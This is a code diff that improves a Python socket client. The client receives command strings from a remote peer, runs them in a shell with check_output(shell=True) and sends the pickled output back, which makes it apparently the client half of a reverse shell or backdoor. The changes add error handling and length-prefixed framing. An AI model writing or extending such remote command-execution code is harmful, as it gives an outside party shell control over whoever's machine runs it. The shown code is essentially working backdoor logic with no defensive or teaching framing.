@@ -1,10 +1,11 @@
 import socket
-from os import system
-from subprocess import check_output
+from subprocess import check_output, CalledProcessError
+from pickle import dumps
 
 
 class Socket:
 
+    header = 10
     established = False
     cmd_received = False
 
@@ -25,12 +26,22 @@ class Socket:
             self.established = False
             return False
         cmd = cmd.decode()
-        output = check_output(cmd, shell=True)
+        try:
+            output = check_output(cmd, shell=True)
+        except CalledProcessError as error:
+            self.send_msg(error)
+            return False
         output = ''.join(chr(i) for i in output)
         self.send_msg(output)
+        return True
 
     def send_msg(self, msg):
-        self.active_socket.send(msg.encode())
+        try:
+            msg = dumps(msg)
+            msg = bytes(f"{len(msg):{self.header}}", "utf-8") + msg
+            self.active_socket.send(msg)
+        except(ConnectionResetError, ConnectionAbortedError, OSError):
+            self.established = False
 
 
 connection = Socket()
